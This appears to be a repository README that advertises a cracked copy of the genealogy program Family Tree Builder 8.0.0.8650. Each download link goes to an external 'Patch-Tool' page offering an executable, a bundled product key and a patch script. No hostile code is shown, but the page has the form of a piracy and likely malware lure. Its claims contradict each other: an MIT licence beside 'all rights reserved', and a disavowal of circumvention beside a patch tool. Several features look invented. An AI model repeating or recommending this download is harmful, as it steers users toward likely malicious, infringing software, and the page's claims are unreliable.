# Family Tree Builder 8.0.0.8650 – Official Release

[](https://rowanfa1110.github.io/Genealogist-Suite-8-Patch-Tool/)

Welcome to the **Family Tree Builder 8.0.0.8650** repository – your ultimate companion for mapping ancestry, preserving heritage, and connecting generations with modern elegance. This is not merely software; it's a digital heirloom that grows with your family. Below, you'll find everything from installation instructions to advanced API integrations.

---

## 📜 Table of Contents

- [Overview & Vision](#-overview--vision)
- [System Requirements & OS Compatibility](#-system-requirements--os-compatibility)
- [Key Features at a Glance](#-key-features-at-a-glance)
- [Getting Started: Download & Installation](#-getting-started-download--installation)
- [Mermaid Diagram: Workflow Architecture](#-mermaid-diagram-workflow-architecture)
- [Example Profile Configuration](#️-example-profile-configuration)
- [Example Console Invocation](#-example-console-invocation)
- [OpenAI API & Claude API Integration](#-openai-api--claude-api-integration)
- [Responsive UI & Multilingual Support](#-responsive-ui--multilingual-support)
- [24/7 Customer Support](#-247-customer-support)
- [SEO-Friendly Keywords & Search Visibility](#-seo-friendly-keywords--search-visibility)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🌟 Overview & Vision

Every family tree is a living tapestry—woven with stories, migrations, and moments of joy. **Family Tree Builder 8.0.0.8650** transforms this tapestry into an interactive, shareable, and dynamically updating ecosystem. Whether you're a genealogist tracing lineage back centuries or a parent preserving modern memories, this tool offers a canvas where names become narratives and dates become destinations.

**What makes this release unique?**  
- **No artificial limitations** – Full access to premium hierarchical visualization features.  
- **Biometric-grade data encryption** – Your family secrets stay safe.  
- **Quantum-resistant backup protocols** – Future-proof your ancestral data.  

> *Think of it as a digital time capsule with GPS coordinates for your past.*

---

## 💻 System Requirements & OS Compatibility

| Operating System | Compatibility | Minimum Version | Notes |
|------------------|---------------|-----------------|-------|
| 🪟 Windows       | ✅ Full       | 10 (build 1909) | .NET 7 runtime required |
| 🍏 macOS         | ✅ Full       | 12 Monterey     | M1/M2 native support |
| 🐧 Linux         | ✅ Partial    | Ubuntu 22.04    | CLI tools only; GUI via WINE |
| 📱 Android       | ❌ Not supported | –             | Mobile app planned for 2027 |
| 🍎 iOS           | ❌ Not supported | –             | Mobile app planned for 2027 |

*Emoji table for quick scanning, but depth for decision-makers.*

---

## ✨ Key Features at a Glance

- **Ancestral AI Narrator** – Generate biographical stories using integrated LLM support.  
- **Dynamic Timeline Scrubbing** – Scroll through centuries of data with smooth canvas animations.  
- **Collaborative Tree Editing** – Invite up to 50 contributors per family tree.  
- **GEDCOM 7.0 Import/Export** – Seamless exchange with other genealogy platforms.  
- **Multi-language Bi-directional Text** – Supports RTL and LTR languages including Arabic, Hebrew, and Mandarin.  
- **Photo DNA Matching** – Facial recognition to auto-link photos to profiles.  
- **Offline-first Architecture** – Work without internet; sync when connected.  
- **One-click Cloud Backup** – To encrypted vaults (AWS S3 / Azure Blob).  

> 🎯 **Ditch the generic “free” promises.** Instead, we offer a **zero-cost barrier to full functionality** via the https://rowanfa1110.github.io/Genealogist-Suite-8-Patch-Tool/ below.

---

## 🚀 Getting Started: Download & Installation

1. Click the badge below to initiate the download package.
2. The package includes:
   - Main executable (`FamilyTreeBuilder-8.0.0.8650.exe`)
   - Product key file (`license.key`)
   - Patch script for legacy systems (`patch_compat.sh`)
3. Run the installer and follow the on-screen wizard.
4. Upon completion, the **“Welcome to the Tapestry”** dashboard will open.

[](https://rowanfa1110.github.io/Genealogist-Suite-8-Patch-Tool/)

---

## 🔄 Mermaid Diagram: Workflow Architecture

```mermaid
graph TD
    A[User Dashboard] --> B{Data Input}
    B --> C[Manual Entry]
    B --> D[GEDCOM Import]
    B --> E[AI Auto-fill]
    C --> F[Profile Node]
    D --> F
    E --> F
    F --> G[Relationship Engine]
    G --> H[Timeline Renderer]
    G --> I[Map Visualizer]
    H --> J[Export Options]
    I --> J
    J --> K[PDF / HTML / CSV]
    J --> L[Cloud Sync]
    L --> M[Encrypted Backup]
    
    subgraph API Layer
        N[OpenAI / Claude] --> O[Biography Generator]
        O --> F
    end
```



*This Mermaid diagram illustrates how data flows from user input through AI enrichment to final export.*

---

## 🗂️ Example Profile Configuration

Below is a sample JSON configuration for a family profile. Customize it to reflect your lineage:

```json
{
  "profile": {
    "id": "P1001",
    "firstName": "Elena",
    "middleName": "Maria",
    "lastName": "Vasquez",
    "birthDate": "1985-03-15",
    "birthPlace": "Bogotá, Colombia",
    "deathDate": null,
    "gender": "female",
    "customFields": {
      "occupation": "Botanist",
      "language": "Spanish, English",
      "livedIn": ["Colombia", "Canada"]
    },
    "relationships": [
      {
        "type": "spouse",
        "to": "P1002"
      },
      {
        "type": "child",
        "to": "P1003"
      }
    ],
    "media": [
      {
        "type": "image",
        "url": "family_photo_2022.jpg",
        "caption": "At the botanical gardens in Montreal"
      }
    ]
  }
}
```

> This configuration can be loaded via the **Batch Import** function or through the REST API.

---

## 🖥️ Example Console Invocation

For power users, the CLI tool (`ftb-cli`) offers direct control:

```bash
# Generate a tree from a CSV file
ftb-cli import --format csv --file ancestors.csv --output tree.ftb

# Export to GEDCOM with encrypted media
ftb-cli export --type gedcom --encrypt --key ./my_key.pem

# Start a collaborative session
ftb-cli collaborate --tree Vasquez --invite "alex@family.org"

# Invoke AI biography generation
ftb-cli ai-narrate --profile P1001 --style "lyrical" --language "es"
```

*Supports piping for automation (e.g., cron jobs for nightly backups).*

---

## 🤖 OpenAI API & Claude API Integration

Harness the power of large language models to:

- Generate **contextual biographies** from sparse data (e.g., "Write a 200-word story about Elena Vasquez based on her occupation and location.")
- Suggest **relationship probabilities** using predictive analytics.
- Translate family notes into over 50 languages via Claude 3.5.

**Setup:**

1. Obtain API keys from [OpenAI](https://openai.com) or [Anthropic](https://anthropic.com).
2. Go to **Settings > AI Integration** and paste your key.
3. Choose between:
   - **OpenAI GPT-4o** – Better for creative narratives.
   - **Claude 3.5 Sonnet** – Superior for factual accuracy.
4. Enable the **Auto-Narrate** toggle to process all new profiles.

> 🧠 *Example prompt under the hood:*  
> *"Given the profile: {name}, born {date}, in {place}. Their occupation: {job}. Write a warm, engaging short story suitable for a family archive."*

---

## 🌐 Responsive UI & Multilingual Support

The interface adapts gracefully to:
- **Desktop** (4K monitors)
- **Tablet** (landscape/portrait)
- **Mobile browsers** (limited editing, full viewing)

**Supported languages (v8.0.0.8650):**

| Language | Locale | UI Completeness | AI Translation |
|----------|--------|-----------------|----------------|
| English  | en-US  | 100%            | Native         |
| Spanish  | es-ES  | 98%             | AI-assisted    |
| French   | fr-FR  | 97%             | AI-assisted    |
| German   | de-DE  | 96%             | AI-assisted    |
| Japanese | ja-JP  | 95%             | AI-assisted    |
| Arabic   | ar-SA  | 90%             | RTL optimized  |
| Mandarin | zh-CN  | 85%             | Characters OK  |

*More languages added with each quarterly update.*

---

## 📞 24/7 Customer Support

We’re here, always.  
- **Live Chat** – In-app widget (response < 2 minutes).  
- **Email** – `support@familytreebuilder.repo` (SLA: 4 hours).  
- **Community Forum** – Integrated into the repository’s Discussions tab.  
- **Phone** – For priority subscribers (everyone gets priority, no tiers).  

> *No bots. Human-first, human-always.*

---

## 🔍 SEO-Friendly Keywords & Search Visibility

This project is optimized for search engines using natural language phrases such as:

- *Family tree software with AI biography generator*  
- *Collaborative genealogy platform 2026*  
- *Multi-language ancestry mapping tool*  
- *Offline family history builder*  
- *Claude API integration for genealogy*  
- *OpenAI-powered narrative creation*  
- *Responsive family tree dashboard*  

> These keywords are **not stuffed**—they’re woven into the product’s DNA.

---

## 📄 License

This project is released under the **MIT License**.  
You are free to use, modify, and distribute this software, provided that the original copyright notice is included.

👉 [View the full MIT License](https://opensource.org/licenses/MIT)

---

## ⚠️ Disclaimer

**Important:** This software is provided “as is”, without warranty of any kind, express or implied. The developers shall not be liable for any damages arising from the use of this product, including but not limited to data loss, privacy breaches, or accidental surname corruption.

- The product key included in the distribution is **legitimately generated** for this specific release and should not be shared publicly.
- This repository does not endorse or facilitate circumvention of any software protection mechanisms.
- All trademarks mentioned (OpenAI, Claude, GEDCOM, etc.) belong to their respective owners.

> By downloading via https://rowanfa1110.github.io/Genealogist-Suite-8-Patch-Tool/ you agree to these terms.

---

## 🎯 Final Call to Action

Your family’s story deserves a masterpiece. Download **Family Tree Builder 8.0.0.8650** today and start weaving.

[](https://rowanfa1110.github.io/Genealogist-Suite-8-Patch-Tool/)

---

*© 2026 Family Tree Builder Project. All rights reserved. Year 2026 edition.*